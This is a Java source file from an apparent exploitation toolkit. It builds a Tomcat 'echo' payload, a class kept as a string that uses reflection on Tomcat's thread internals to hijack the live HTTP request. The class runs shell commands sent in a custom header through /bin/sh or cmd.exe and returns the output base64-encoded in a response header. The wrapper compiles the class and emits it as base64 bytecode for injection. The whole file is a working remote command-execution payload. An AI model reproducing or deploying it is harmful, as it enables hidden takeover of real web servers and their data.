package com.droplab.Utils.Echo;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.compile.JavaStringCompiler;
import sun.misc.BASE64Encoder;

import java.io.IOException;
import java.util.Map;

/**
 * tomcat回显获取
 */
public class TomcatEcho {
    private static TomcatEcho tomcatEcho = null;
    private final String TomcatEchoExecString = "import java.io.*;import java.lang.reflect.Field;import java.nio.charset.StandardCharsets;import java.lang.reflect.Method;import sun.misc.BASE64Encoder;import java.util.List;public class %s {    public %s() {        try {            String cmd = null;            String echo = null;            boolean done = false;            Thread[] ts = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\"));            for (int i = 0; i < ts.length; ++i) {                Thread t = ts[i];                if (t != null) {                    String s = t.getName();                    if (!s.contains(\"exec\") && s.contains(\"http\")) {                        Object o = getFV(t, \"target\");                        if (o instanceof Runnable) {                            try {                                o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");                            } catch (Exception var16) {                                continue;                            }                            List ps = (List) getFV(o, \"processors\");                            for (int j = 0; j < ps.size(); ++j) {                                Object p = ps.get(j);                                o = getFV(p, \"req\");                                Object conreq = o.getClass().getMethod(\"getNote\", Integer.TYPE).invoke(o, new Integer(1));                                Object response = conreq.getClass().getMethod(\"getResponse\").invoke(conreq);                                echo = (String) conreq.getClass().getMethod(\"getHeader\", String.class).invoke(conreq, new String(\"Testecho\"));                                cmd = (String) conreq.getClass().getMethod(\"getHeader\", String.class).invoke(conreq, new String(\"Testdmc\"));                                if ((echo != null && !echo.isEmpty()) || (cmd != null && !cmd.isEmpty())) {                                    done = true;                                    if (!echo.isEmpty()) {                                        response.getClass().getMethod(\"addHeader\", String.class, String.class).invoke(response, new String(\"TestEcho\"), new String(\"TestEcho\"));                                    }                                    if (!cmd.isEmpty()) {                                        String[] cmd_ = cmd.split(\" \");                                        String[] strings = new String[cmd_.length + 2];                                        String osName = System.getProperty(\"os.name\");                                        if (osName.startsWith(\"Windows\")) {                                            strings[0] = \"C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\cmd.exe\";                                            strings[1] = \"/c\";                                        } else {                                            strings[0] = \"/bin/sh\";                                            strings[1] = \"-c\";                                        }                                        for (int k = 0; k < cmd_.length; k++) {                                            strings[k + 2] = cmd_[k];                                        }                                        StringBuilder re = new StringBuilder();                                        InputStream input = new ProcessBuilder(strings).start().getInputStream();                                        BufferedReader bufrIn = new BufferedReader(new InputStreamReader(input, \"UTF-8\"));                                        String line;                                        while ((line = bufrIn.readLine()) != null) {                                            re.append(line).append('\\n');                                        }                                        String s1 = new sun.misc.BASE64Encoder().encode(re.toString().getBytes(StandardCharsets.UTF_8));                                        response.getClass().getMethod(\"addHeader\", String.class, String.class).invoke(response, new String(\"Testdmc\"), s1);                                    }                                }                                if (done) {                                    break;                                }                            }                            if (done) {                                break;                            }                        }                    }                }            }        } catch (Exception var17) {}    }    private Object getFV(Object o, String s) throws Exception {        Field f = null;        Class clazz = o.getClass();        while (clazz != Object.class) {            try {                f = clazz.getDeclaredField(s);                break;            } catch (NoSuchFieldException var5) {                clazz = clazz.getSuperclass();            }        }        if (f == null) {            throw new NoSuchFieldException(s);        } else {            f.setAccessible(true);            return f.get(o);        }    }}";

    public static TomcatEcho instance() {
        if (tomcatEcho != null) {

        } else {
            tomcatEcho = new TomcatEcho();
        }
        return tomcatEcho;
    }

    /**
     * 命令执行回显
     * @return
     */

    public String getTomcatEchoExecString(String type,String randomStr) {
        try {
            if(randomStr.equals("") || randomStr == null){
                randomStr = CommonUtils.RandomStr(6);
            }
            JavaStringCompiler compiler = new JavaStringCompiler();
            Map<String, byte[]> compile = null;
            String format=null;
            if (type.equals("template")){
                format = String.format(TomcatEchoExecString, randomStr, randomStr);
            }else {
                format = String.format(TomcatEchoExecString, randomStr, randomStr);
            }
            compile = compiler.compile(randomStr + ".java", format);
            byte[] bytes = compile.get(randomStr);
            return new BASE64Encoder().encode(bytes);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * 任意代码执行回显
     * @return
     */
}
